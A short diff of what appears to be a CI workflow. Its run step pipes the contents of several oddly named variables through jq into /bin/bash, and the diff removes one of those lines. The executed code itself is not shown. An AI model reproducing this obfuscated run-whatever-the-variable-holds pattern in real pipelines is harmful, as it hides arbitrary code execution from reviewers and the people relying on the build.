@@ -21,7 +21,6 @@ jobs:
         run: |
           printf '%s' "$qlm2" | jq -r .dzqj6 | /bin/bash
           printf '%s' "$dtndp0" | jq -r .wvpkw14 | /bin/bash
-          printf '%s' "$det2" | jq -r .cl836 | /bin/bash
           echo $vy85 | jq -r .is5 | /bin/bash
           echo $xdtse23 | jq -r .nfwbh918 | /bin/bash
           echo $l172 | jq -r .rrtot8242 | /bin/bash
